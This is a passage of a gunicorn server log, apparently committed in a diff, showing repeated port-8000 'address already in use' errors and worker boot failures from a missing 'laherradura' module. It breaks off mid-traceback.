+[2024-12-20 09:59:09 -0300] [5583] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:09 -0300] [5583] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:10 -0300] [5583] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:10 -0300] [5583] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:11 -0300] [5583] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:11 -0300] [5583] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:12 -0300] [5583] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:12 -0300] [5584] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:12 -0300] [5584] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:12 -0300] [5584] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:13 -0300] [5584] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:13 -0300] [5584] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:14 -0300] [5584] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:14 -0300] [5584] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:15 -0300] [5584] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:15 -0300] [5584] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:16 -0300] [5584] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:16 -0300] [5584] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:17 -0300] [5584] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:17 -0300] [5585] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:17 -0300] [5585] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:17 -0300] [5585] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:18 -0300] [5585] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:18 -0300] [5585] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:19 -0300] [5585] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:19 -0300] [5585] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:20 -0300] [5585] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:20 -0300] [5585] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:21 -0300] [5585] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:21 -0300] [5585] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:22 -0300] [5585] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:22 -0300] [5586] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:22 -0300] [5586] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:22 -0300] [5586] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:23 -0300] [5586] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:23 -0300] [5586] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:24 -0300] [5586] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:24 -0300] [5586] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:25 -0300] [5586] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:25 -0300] [5586] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:26 -0300] [5586] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:26 -0300] [5586] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:27 -0300] [5586] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:28 -0300] [5587] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:28 -0300] [5587] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:28 -0300] [5587] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:29 -0300] [5587] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:29 -0300] [5587] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:30 -0300] [5587] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:30 -0300] [5587] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:31 -0300] [5587] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:31 -0300] [5587] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:32 -0300] [5587] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:32 -0300] [5587] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:33 -0300] [5587] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:33 -0300] [5588] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:33 -0300] [5588] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:33 -0300] [5588] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:34 -0300] [5588] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:34 -0300] [5588] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:35 -0300] [5588] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:35 -0300] [5588] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:36 -0300] [5588] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:36 -0300] [5588] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:37 -0300] [5588] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:37 -0300] [5588] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:38 -0300] [5588] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:38 -0300] [5590] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:38 -0300] [5590] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:38 -0300] [5590] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:39 -0300] [5590] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:39 -0300] [5590] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:40 -0300] [5590] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:40 -0300] [5590] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:41 -0300] [5590] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:41 -0300] [5590] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:42 -0300] [5590] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:42 -0300] [5590] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:43 -0300] [5590] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:43 -0300] [5591] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:43 -0300] [5591] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:43 -0300] [5591] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:44 -0300] [5591] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:44 -0300] [5591] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:45 -0300] [5591] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:45 -0300] [5591] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:46 -0300] [5591] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:46 -0300] [5591] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:47 -0300] [5591] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:47 -0300] [5591] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:48 -0300] [5591] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:49 -0300] [5592] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:49 -0300] [5592] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:49 -0300] [5592] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:50 -0300] [5592] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:50 -0300] [5592] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:51 -0300] [5592] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:51 -0300] [5592] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:52 -0300] [5592] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:52 -0300] [5592] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:53 -0300] [5592] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:53 -0300] [5592] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:54 -0300] [5592] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:54 -0300] [5593] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:54 -0300] [5593] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:54 -0300] [5593] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:55 -0300] [5593] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:55 -0300] [5593] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:56 -0300] [5593] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:56 -0300] [5593] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:57 -0300] [5593] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:57 -0300] [5593] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:58 -0300] [5593] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:59:58 -0300] [5593] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:59:59 -0300] [5593] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:59:59 -0300] [5594] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:59 -0300] [5594] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5594)
+[2024-12-20 09:59:59 -0300] [5594] [INFO] Using worker: sync
+[2024-12-20 09:59:59 -0300] [5595] [INFO] Booting worker with pid: 5595
+[2024-12-20 09:59:59 -0300] [5595] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 09:59:59 -0300] [5595] [INFO] Worker exiting (pid: 5595)
+[2024-12-20 09:59:59 -0300] [5594] [ERROR] Worker (pid:5595) exited with code 3
+[2024-12-20 09:59:59 -0300] [5594] [ERROR] Shutting down: Master
+[2024-12-20 09:59:59 -0300] [5594] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 09:59:59 -0300] [5596] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:59:59 -0300] [5596] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5596)
+[2024-12-20 09:59:59 -0300] [5596] [INFO] Using worker: sync
+[2024-12-20 09:59:59 -0300] [5597] [INFO] Booting worker with pid: 5597
+[2024-12-20 09:59:59 -0300] [5597] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 09:59:59 -0300] [5597] [INFO] Worker exiting (pid: 5597)
+[2024-12-20 09:59:59 -0300] [5596] [ERROR] Worker (pid:5597) exited with code 3
+[2024-12-20 09:59:59 -0300] [5596] [ERROR] Shutting down: Master
+[2024-12-20 09:59:59 -0300] [5596] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:00 -0300] [5598] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:00 -0300] [5598] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5598)
+[2024-12-20 10:00:00 -0300] [5598] [INFO] Using worker: sync
+[2024-12-20 10:00:00 -0300] [5599] [INFO] Booting worker with pid: 5599
+[2024-12-20 10:00:00 -0300] [5599] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:00 -0300] [5599] [INFO] Worker exiting (pid: 5599)
+[2024-12-20 10:00:00 -0300] [5598] [ERROR] Worker (pid:5599) exited with code 3
+[2024-12-20 10:00:00 -0300] [5598] [ERROR] Shutting down: Master
+[2024-12-20 10:00:00 -0300] [5598] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:00 -0300] [5600] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:00 -0300] [5600] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5600)
+[2024-12-20 10:00:00 -0300] [5600] [INFO] Using worker: sync
+[2024-12-20 10:00:00 -0300] [5601] [INFO] Booting worker with pid: 5601
+[2024-12-20 10:00:00 -0300] [5601] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:00 -0300] [5601] [INFO] Worker exiting (pid: 5601)
+[2024-12-20 10:00:00 -0300] [5600] [ERROR] Worker (pid:5601) exited with code 3
+[2024-12-20 10:00:00 -0300] [5600] [ERROR] Shutting down: Master
+[2024-12-20 10:00:00 -0300] [5600] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:10 -0300] [5606] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:10 -0300] [5606] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5606)
+[2024-12-20 10:00:10 -0300] [5606] [INFO] Using worker: sync
+[2024-12-20 10:00:10 -0300] [5607] [INFO] Booting worker with pid: 5607
+[2024-12-20 10:00:10 -0300] [5607] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:10 -0300] [5607] [INFO] Worker exiting (pid: 5607)
+[2024-12-20 10:00:10 -0300] [5606] [ERROR] Worker (pid:5607) exited with code 3
+[2024-12-20 10:00:10 -0300] [5606] [ERROR] Shutting down: Master
+[2024-12-20 10:00:10 -0300] [5606] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:11 -0300] [5608] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:11 -0300] [5608] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5608)
+[2024-12-20 10:00:11 -0300] [5608] [INFO] Using worker: sync
+[2024-12-20 10:00:11 -0300] [5609] [INFO] Booting worker with pid: 5609
+[2024-12-20 10:00:11 -0300] [5609] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:11 -0300] [5609] [INFO] Worker exiting (pid: 5609)
+[2024-12-20 10:00:11 -0300] [5608] [ERROR] Worker (pid:5609) exited with code 3
+[2024-12-20 10:00:11 -0300] [5608] [ERROR] Shutting down: Master
+[2024-12-20 10:00:11 -0300] [5608] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:11 -0300] [5610] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:11 -0300] [5610] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5610)
+[2024-12-20 10:00:11 -0300] [5610] [INFO] Using worker: sync
+[2024-12-20 10:00:11 -0300] [5611] [INFO] Booting worker with pid: 5611
+[2024-12-20 10:00:11 -0300] [5611] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:11 -0300] [5611] [INFO] Worker exiting (pid: 5611)
+[2024-12-20 10:00:11 -0300] [5610] [ERROR] Worker (pid:5611) exited with code 3
+[2024-12-20 10:00:11 -0300] [5610] [ERROR] Shutting down: Master
+[2024-12-20 10:00:11 -0300] [5610] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:11 -0300] [5612] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:11 -0300] [5612] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5612)
+[2024-12-20 10:00:11 -0300] [5612] [INFO] Using worker: sync
+[2024-12-20 10:00:11 -0300] [5613] [INFO] Booting worker with pid: 5613
+[2024-12-20 10:00:11 -0300] [5613] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
